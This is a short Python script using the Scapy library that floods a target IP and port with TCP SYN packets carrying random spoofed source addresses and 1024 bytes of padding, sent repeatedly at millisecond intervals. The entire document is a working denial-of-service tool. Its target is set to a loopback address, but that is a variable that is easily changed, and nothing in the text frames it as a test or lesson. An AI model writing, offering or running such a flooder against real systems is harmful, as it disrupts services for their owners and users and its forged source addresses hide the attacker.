from scapy.all import *

def send_spoofed_packets(target_ip, target_port):
    packet = IP(src=RandIP(), dst=target_ip) / TCP(dport=target_port, flags="S") / Raw(b"A" * 1024)
    send(packet, loop=1024, verbose=0, inter=0.001)

target_ip = "127.0.0.53"  
target_port = 9000

send_spoofed_packets(target_ip, target_port)
